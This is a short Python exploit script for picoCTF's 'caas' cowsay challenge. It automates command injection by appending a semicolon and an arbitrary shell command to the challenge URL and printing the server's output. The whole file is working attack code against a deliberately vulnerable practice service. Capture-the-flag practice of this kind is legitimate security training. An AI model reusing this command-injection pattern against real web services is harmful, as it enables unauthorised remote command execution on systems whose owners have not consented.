#!/usr/bin/python3
# Coded by twitter: @volshebrer to automate command injection on caas ctf (Author: BROWNIEINMOTION) from picoCTF.
import requests
import sys
if len(sys.argv) < 2 or len(sys.argv) > 2:
    print("E: Usage : <caas.py> <'command'>")
    print("Help: Try <caas.py> 'ls'")
else:
    r = requests.get('https://caas.mars.picoctf.net/cowsay/{message};' + sys.argv[1])
    print(r)
    print(r.text)

